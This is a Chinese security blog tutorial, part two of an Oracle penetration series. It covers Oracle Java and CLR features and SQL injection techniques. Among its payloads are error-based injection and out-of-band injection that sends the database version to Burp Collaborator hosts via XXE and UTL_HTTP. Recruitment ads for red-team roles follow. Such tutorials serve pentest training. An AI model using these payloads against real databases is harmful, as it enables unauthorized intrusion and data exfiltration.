> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492148&idx=1&sn=49c2ecc215b7c8b34f41c6006c6e9ae2&chksm=f25872c7c52ffbd124be3487bf664633de406057082643f18f9555a526556695c8ad527a398c&scene=21#wechat_redirect)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_👇点击阅读第一章内容_  

[**Oracle 渗透利用（一）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492016&idx=1&sn=65dda868965a025bb78c2f4e6bb3ec9e&chksm=f2587343c52ffa55f3162b9aca445a2b7441b587d7b4157a1abdc976368c0bb63a92fb7ed84c&scene=21#wechat_redirect)主要介绍了 Oracle 的体系结构，这一章我们将介绍 Oracle Java 支持、Oracle CLR 和 Oracle SQL 注入技巧。

**Oracle Java 支持**

在 Oracle 8i 之后，Oracle 增加了对 Java 语言的支持，所以提供了 Java 池（可选，一个内存区域），用于存放 Java 代码、Java 语句的语法分析表、Java 语句的执行方案和 Java 虚拟机中的数据，以便进行 Java 程序开发。

既可以使用 SQL 语句从 java 源代码创建存储过程，也可以利用外部的 class 文件（java 源代码文件、jar 包）创建（既可以在 SQL 语句中加载，也可使用 loadjava）。

drop java class "ExploitDecode"

要加引号，并且不能直接删除类，需要把引用它的内容先删除，这点与 sql server 的 clr 很相似

查看所有 JAVA 类

select * from DBA_JAVA_CLASSES

select * from USER_JAVA_CLASSES

select * from ALL_JAVA_CLASSES

**Oracle CLR**

通过 PL/SQL 调用外部的 DLL 来实现的存储过程

**Oracle SQL 注入技巧**

**Oracle 双引号通常被当做普通字符**

进行注入测试时，通常只考虑单引号即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4N0anxV9bd3RhzCJqaMKzfXwpu1vMyyLiaZYBR9nEHVYaIDBY1vOhYRQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4ibIiaw2ErNfKhfhx6H9dPJ9TTW91NnJqAVAPy2Ye6p5pUDph7m5UrWNw/640?wx_fmt=png)

    但是可以用来包裹字段名

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4JRA8fGOzeOK7MtFc9F6ruWGsVFFPBaia2G1qun6cEGibib3fMEHw8qDQQ/640?wx_fmt=png)

**Oracle 注释符是 -- 和 /***

单行注释

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4AiazjNaXIhw49cPbTorwhOVGghng3QYib9u2vGibzd0zsSSVXVZyqGgMQ/640?wx_fmt=png)

多行注释，需要闭合

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4icvKoiciaCEfErpxXqK0fBOegRUZ66HNNQUVJGibkmvUAFzPHUr1sn1xbg/640?wx_fmt=png)

**Oracle 字符串连接符是 ||**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4TjZhLsPicMgPF7YSpSMNJQQOPZrBEechpLiaKeG6wrKmmLXK9SC3baQg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4mcMzWaibyrFJMhpFNt4EXTjjEvWMgrY7seWavy6iaEcmPD3dB98g4IvQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib43j3hibBJtnfJbqYyVIjiafW1Eibib2BJLjslDPnkicT5jfSs9WFFicM1zPWA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4HKEsDmxqRnx1bWcIJnCqib6Z9EmHoRsgGibrziaOzjWt2XvdnY7q1BeiaA/640?wx_fmt=png)

**oracle 带外注入**

oralce9i 开始我们对 oracle 数据库进行攻击的时候通常需要确定数据库的版本，以便确定是否能进行进一步的利用，这里举一个带外查询数据库版本的例子，因为域名中不能出现特殊字符，所以需要进行编码，经过测试一个子域名最长是 64 个字节（猜测与 dns 服务器的具体实现有关，后边再看 dns 服务器具体实现对 dns 查询请求 A 记录名称长度的规定），但是 select BANNER from v$version where rownum=1 返回的第一条信息编码后的长度远超过 64 个字节，可以看出第三行数据比较短，但是 oracle 没有 limit 语句，就很不方便。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib42TDHt2YG9UDSRwu9doeUHb4cyLicia6v90TCzF8OiaOafEOfNBU4zbXZA/640?wx_fmt=png)

我们可以用这条语句达到同样的效果，因为我们只需要获取到版本即可

SELECT VERSION FROM PRODUCT_COMPONENT_VERSION where ROWNUM=1

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4lpYvPua08mrxHg28VGymIRluT4xNxIRobxqd8dK1kt3aYHaaaicfWzQ/640?wx_fmt=png)

```
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT rawtohex(VERSION) FROM PRODUCT_COMPONENT_VERSION where ROWNUM=1)||'.fl4oiu2as1pycr4g77lqjsk8yz4pse.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4c8mOcESjtk15aXkbeR4eDtlZmbViaYFmxlQe3AJKDyj6OzymJfibEMMQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib42DkHrSIbkBwazHKh0QwuCzJswAyjUsCVJ12WABXdZg2nbPCVEYbtWQ/640?wx_fmt=png)

进行其他操作同样需要考虑以上问题

也可以使用 UTL_HTTP

```
select * from t_user where name='admin' || utl_http.request('http://'||(SELECT RAWTOHEX(VERSION) FROM PRODUCT_COMPONENT_VERSION where ROWNUM=1)||'.ujh1wgf4gp9zr79ra4270zdt7kda1z.burpcollaborator.net')
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4kSkmMTbTFXkrUZeg72yiah2ibJNwTlwVibOB8XzYy1rz4NseRd4X5NDHA/640?wx_fmt=png)

**使用 Oracle 专属函数判断是否为 Oracle 数据库**

to_char、to_number

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib40ky2xwzciapQEz9bOibWnP39duWZBJaciaYianMbIOQFcDmu0DRicXicLeNA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4mTyP0O9MhpDZInuIoTwBXia2S36MFET5dMZqQ97Hjbpqjqiaz2e8dfnA/640?wx_fmt=png)

支持科学计数法

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib46tDGIBibEicSGUD7boeM7ALC5icKM8o0HTmURvZiawW0ooIBq4t7H3yKicA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib44InPIm6LlLRRibCwY5wVeOE6a0aibicykoBdib1B1p1kHhPQa8BTIsrDHg/640?wx_fmt=png)

**使用 instr 替代 like**

instr 函数，返回参数二在参数一中第一次出现的位置（从 1 开始）

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib436rhCw0PRibOsrRJYiaibnXSIR741PVzUzmBx2AUA8VnQ0DbTTXKZBbkA/640?wx_fmt=png)

**报错注入**

select * from t_user where name='admin' || dbms_xdb_version.checkin(user)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwxdgoCmPeWZDjwDfbeTib4an8XYicYNogU147FibyMRfoib7AhkSmrZ6DMEGzxuQ8Ys4cQ4ejnz3whg/640?wx_fmt=png)

  

  

本章主要介绍了 Oracle Java 支持、Oracle CLR 和 Oracle SQL 注入技巧，下一章我们将介绍 Oracle 命令执行技巧和 Oracle 其他利用。

_👇点击阅读第一章内容_  

[**Oracle 渗透利用（一）**](http://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652492016&idx=1&sn=65dda868965a025bb78c2f4e6bb3ec9e&chksm=f2587343c52ffa55f3162b9aca445a2b7441b587d7b4157a1abdc976368c0bb63a92fb7ed84c&scene=21#wechat_redirect)

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JX1av2ACppVAI0QeqjSPTdCPpJXkaYMAlxSH7KZtiblmPBzy8TjXL6vRyAZRNJgVBwTUrkryxAJUaw/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**